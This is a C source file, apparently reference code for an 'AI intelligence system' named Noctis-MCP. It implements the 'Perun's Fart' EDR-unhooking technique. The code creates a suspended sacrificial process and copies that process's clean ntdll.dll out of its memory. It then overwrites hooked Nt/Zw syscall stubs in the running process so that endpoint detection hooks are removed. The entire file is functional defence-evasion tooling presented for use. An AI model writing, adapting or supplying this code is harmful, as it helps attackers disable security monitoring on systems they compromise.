// Reference code for Noctis-MCP AI intelligence system
// Perun's Fart Implementation

#include "peruns_fart.h"
#include <stdio.h>

// PEB structures for remote process traversal
typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// Initialize unhooking context
BOOL PerunsFart_Initialize(
    PUNHOOK_CONTEXT pContext,
    LPCWSTR wzSacrificialProcess,
    BOOL bUnhookAll
) {
    if (!pContext || !wzSacrificialProcess) return FALSE;

    ZeroMemory(pContext, sizeof(UNHOOK_CONTEXT));

    // Store configuration
    wcsncpy_s(pContext->config.wzSacrificialProcess, MAX_PATH,
              wzSacrificialProcess, _TRUNCATE);
    pContext->config.bUnhookAll = bUnhookAll;

    // Get local ntdll.dll base address
    pContext->pLocalNtdllBase = GetModuleHandleW(L"ntdll.dll");
    if (!pContext->pLocalNtdllBase) {
        return FALSE;
    }

    // Get ntdll size from PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pContext->pLocalNtdllBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pContext->pLocalNtdllBase + pDosHeader->e_lfanew);
    pContext->szNtdllSize = pNtHeaders->OptionalHeader.SizeOfImage;

    return TRUE;
}

// Internal: Create sacrificial process (suspended)
BOOL _PerunsFart_CreateSacrificialProcess(PUNHOOK_CONTEXT pContext) {
    if (!pContext) return FALSE;

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    // Create suspended process (won't execute EDR hooks)
    BOOL bResult = CreateProcessW(
        pContext->config.wzSacrificialProcess,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!bResult) {
        return FALSE;
    }

    pContext->hSacrificialProcess = pi.hProcess;
    pContext->hSacrificialThread = pi.hThread;
    pContext->dwSacrificialPID = pi.dwProcessId;

    return TRUE;
}

// Internal: Find ntdll.dll in remote process memory
BOOL _PerunsFart_FindRemoteNtdll(PUNHOOK_CONTEXT pContext) {
    if (!pContext || !pContext->hSacrificialProcess) return FALSE;

    // Get remote process PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG ulReturnLength = 0;

    typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
    );

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    fnNtQueryInformationProcess pNtQueryInformationProcess =
        (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!pNtQueryInformationProcess) return FALSE;

    NTSTATUS status = pNtQueryInformationProcess(
        pContext->hSacrificialProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &ulReturnLength
    );

    if (status != 0) return FALSE;

    // Read PEB from remote process
    PEB remotePeb = { 0 };
    SIZE_T szBytesRead = 0;

    if (!ReadProcessMemory(pContext->hSacrificialProcess, pbi.PebBaseAddress,
                          &remotePeb, sizeof(PEB), &szBytesRead)) {
        return FALSE;
    }

    // Read PEB_LDR_DATA
    PEB_LDR_DATA ldrData = { 0 };
    if (!ReadProcessMemory(pContext->hSacrificialProcess, remotePeb.Ldr,
                          &ldrData, sizeof(PEB_LDR_DATA), &szBytesRead)) {
        return FALSE;
    }

    // Traverse InLoadOrderModuleList to find ntdll.dll
    LIST_ENTRY* pListHead = &ldrData.InLoadOrderModuleList;
    LIST_ENTRY* pCurrentEntry = ldrData.InLoadOrderModuleList.Flink;

    // CRITICAL FIX: Add iteration limit and null checks to prevent infinite loop
    DWORD dwMaxIterations = 1000;
    DWORD dwIterations = 0;

    while (pCurrentEntry != pListHead && pCurrentEntry != NULL && dwIterations < dwMaxIterations) {
        dwIterations++;

        LDR_DATA_TABLE_ENTRY ldrEntry = { 0 };

        if (!ReadProcessMemory(pContext->hSacrificialProcess,
                              CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks),
                              &ldrEntry, sizeof(LDR_DATA_TABLE_ENTRY), &szBytesRead)) {
            return FALSE;
        }

        // Read module name with bounds checking
        WCHAR wzModuleName[MAX_PATH] = { 0 };
        if (ldrEntry.BaseDllName.Length > 0 &&
            ldrEntry.BaseDllName.Length < MAX_PATH * 2 &&
            ldrEntry.BaseDllName.Buffer != NULL) {

            if (ReadProcessMemory(pContext->hSacrificialProcess, ldrEntry.BaseDllName.Buffer,
                                wzModuleName, ldrEntry.BaseDllName.Length, &szBytesRead)) {

                // Validate read was successful
                if (szBytesRead == ldrEntry.BaseDllName.Length) {
                    if (_wcsicmp(wzModuleName, L"ntdll.dll") == 0) {
                        pContext->pRemoteNtdllBase = ldrEntry.DllBase;
                        return TRUE;
                    }
                }
            }
        }

        // Validate Flink before advancing
        if (ldrEntry.InLoadOrderLinks.Flink == NULL ||
            ldrEntry.InLoadOrderLinks.Flink == pCurrentEntry) {
            break;  // Circular reference or null - stop
        }

        pCurrentEntry = ldrEntry.InLoadOrderLinks.Flink;
    }

    return FALSE;
}

// Internal: Read clean ntdll from sacrificial process
BOOL _PerunsFart_ReadCleanNtdll(PUNHOOK_CONTEXT pContext) {
    if (!pContext || !pContext->hSacrificialProcess || !pContext->pRemoteNtdllBase) {
        return FALSE;
    }

    // Allocate buffer for clean ntdll
    pContext->pCleanNtdll = HeapAlloc(GetProcessHeap(), 0, pContext->szNtdllSize);
    if (!pContext->pCleanNtdll) {
        return FALSE;
    }

    // Read entire ntdll from sacrificial process memory (NOT from disk)
    SIZE_T szBytesRead = 0;
    BOOL bResult = ReadProcessMemory(
        pContext->hSacrificialProcess,
        pContext->pRemoteNtdllBase,
        pContext->pCleanNtdll,
        pContext->szNtdllSize,
        &szBytesRead
    );

    if (!bResult || szBytesRead != pContext->szNtdllSize) {
        HeapFree(GetProcessHeap(), 0, pContext->pCleanNtdll);
        pContext->pCleanNtdll = NULL;
        return FALSE;
    }

    return TRUE;
}

// Internal: Unhook syscall stubs in current process
BOOL _PerunsFart_UnhookSyscalls(PUNHOOK_CONTEXT pContext) {
    if (!pContext || !pContext->pCleanNtdll || !pContext->pLocalNtdllBase) {
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pContext->pCleanNtdll;

    // CRITICAL FIX: Validate DOS header
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ||
        pDosHeader->e_lfanew >= (LONG)pContext->szNtdllSize - sizeof(IMAGE_NT_HEADERS)) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pContext->pCleanNtdll + pDosHeader->e_lfanew);

    // Validate NT headers
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Validate export directory RVA
    DWORD dwExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (dwExportDirRVA == 0 || dwExportDirRVA >= pContext->szNtdllSize - sizeof(IMAGE_EXPORT_DIRECTORY)) {
        return FALSE;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)pContext->pCleanNtdll + dwExportDirRVA
    );

    // Validate export table RVAs
    if (pExportDir->AddressOfFunctions >= pContext->szNtdllSize ||
        pExportDir->AddressOfNames >= pContext->szNtdllSize ||
        pExportDir->AddressOfNameOrdinals >= pContext->szNtdllSize) {
        return FALSE;
    }

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)pContext->pCleanNtdll + pExportDir->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)pContext->pCleanNtdll + pExportDir->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)pContext->pCleanNtdll + pExportDir->AddressOfNameOrdinals);

    DWORD dwUnhookedCount = 0;

    // Iterate through all exported functions
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR pszFunctionName = (LPCSTR)((BYTE*)pContext->pCleanNtdll + pAddressOfNames[i]);

        // Unhook only Nt* and Zw* functions (syscalls)
        if (strncmp(pszFunctionName, "Nt", 2) == 0 || strncmp(pszFunctionName, "Zw", 2) == 0) {
            WORD wOrdinal = pAddressOfNameOrdinals[i];
            DWORD dwFunctionRVA = pAddressOfFunctions[wOrdinal];

            PVOID pCleanFunction = (BYTE*)pContext->pCleanNtdll + dwFunctionRVA;
            PVOID pHookedFunction = (BYTE*)pContext->pLocalNtdllBase + dwFunctionRVA;

            // Compare first 32 bytes to detect hooks
            if (PerunsFart_IsFunctionHooked(pHookedFunction, pCleanFunction, 32)) {
                if (PerunsFart_UnhookFunction(pszFunctionName, pContext->pCleanNtdll)) {
                    dwUnhookedCount++;
                }
            }
        }
    }

    return (dwUnhookedCount > 0);
}

// Internal: Terminate sacrificial process
BOOL _PerunsFart_TerminateSacrificialProcess(PUNHOOK_CONTEXT pContext) {
    if (!pContext || !pContext->hSacrificialProcess) return FALSE;

    BOOL bResult = TerminateProcess(pContext->hSacrificialProcess, 0);

    if (pContext->hSacrificialThread) {
        CloseHandle(pContext->hSacrificialThread);
        pContext->hSacrificialThread = NULL;
    }

    if (pContext->hSacrificialProcess) {
        CloseHandle(pContext->hSacrificialProcess);
        pContext->hSacrificialProcess = NULL;
    }

    return bResult;
}

// Execute unhooking operation
BOOL PerunsFart_Execute(PUNHOOK_CONTEXT pContext) {
    if (!pContext) return FALSE;

    // Step 1: Create sacrificial process (suspended)
    if (!_PerunsFart_CreateSacrificialProcess(pContext)) {
        return FALSE;
    }

    // Step 2: Find ntdll.dll in sacrificial process memory
    if (!_PerunsFart_FindRemoteNtdll(pContext)) {
        _PerunsFart_TerminateSacrificialProcess(pContext);
        return FALSE;
    }

    // Step 3: Read clean ntdll from sacrificial process (NOT from disk)
    if (!_PerunsFart_ReadCleanNtdll(pContext)) {
        _PerunsFart_TerminateSacrificialProcess(pContext);
        return FALSE;
    }

    // Step 4: Unhook syscalls in current process
    if (!_PerunsFart_UnhookSyscalls(pContext)) {
        _PerunsFart_TerminateSacrificialProcess(pContext);
        return FALSE;
    }

    // Step 5: Terminate sacrificial process
    _PerunsFart_TerminateSacrificialProcess(pContext);

    return TRUE;
}

// Cleanup unhooking context
VOID PerunsFart_Cleanup(PUNHOOK_CONTEXT pContext) {
    if (!pContext) return;

    // Free clean ntdll buffer
    if (pContext->pCleanNtdll) {
        SecureZeroMemory(pContext->pCleanNtdll, pContext->szNtdllSize);
        HeapFree(GetProcessHeap(), 0, pContext->pCleanNtdll);
        pContext->pCleanNtdll = NULL;
    }

    // Terminate sacrificial process if still running
    _PerunsFart_TerminateSacrificialProcess(pContext);

    // Zero context
    SecureZeroMemory(pContext, sizeof(UNHOOK_CONTEXT));
}

// Utility: Check if function is hooked (compare bytes)
BOOL PerunsFart_IsFunctionHooked(PVOID pLocalFunc, PVOID pCleanFunc, SIZE_T szCompareSize) {
    if (!pLocalFunc || !pCleanFunc) return FALSE;

    return (memcmp(pLocalFunc, pCleanFunc, szCompareSize) != 0);
}

// Utility: Unhook single function
BOOL PerunsFart_UnhookFunction(LPCSTR pszFunctionName, PVOID pCleanNtdll) {
    if (!pszFunctionName || !pCleanNtdll) return FALSE;

    HMODULE hLocalNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hLocalNtdll) return FALSE;

    PVOID pLocalFunction = GetProcAddress(hLocalNtdll, pszFunctionName);
    if (!pLocalFunction) return FALSE;

    // Get clean function from clean ntdll buffer
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)pCleanNtdll +
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)pCleanNtdll + pExportDir->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)pCleanNtdll + pExportDir->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)pCleanNtdll + pExportDir->AddressOfNameOrdinals);

    // Find function in clean ntdll
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR pszCurrentName = (LPCSTR)((BYTE*)pCleanNtdll + pAddressOfNames[i]);
        if (strcmp(pszCurrentName, pszFunctionName) == 0) {
            WORD wOrdinal = pAddressOfNameOrdinals[i];
            DWORD dwFunctionRVA = pAddressOfFunctions[wOrdinal];
            PVOID pCleanFunction = (BYTE*)pCleanNtdll + dwFunctionRVA;

            // Copy clean bytes to local function (unhook)
            DWORD dwOldProtect;
            if (!VirtualProtect(pLocalFunction, 32, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
                return FALSE;
            }

            memcpy(pLocalFunction, pCleanFunction, 32);

            VirtualProtect(pLocalFunction, 32, dwOldProtect, &dwOldProtect);
            return TRUE;
        }
    }

    return FALSE;
}

// Utility: Get module base address in remote process (via PEB)
PVOID PerunsFart_GetRemoteModuleBase(HANDLE hProcess, LPCWSTR wzModuleName) {
    if (!hProcess || !wzModuleName) return NULL;

    // This is a simplified version - full implementation would traverse PEB
    // Similar to _PerunsFart_FindRemoteNtdll but for any module

    return NULL;
}
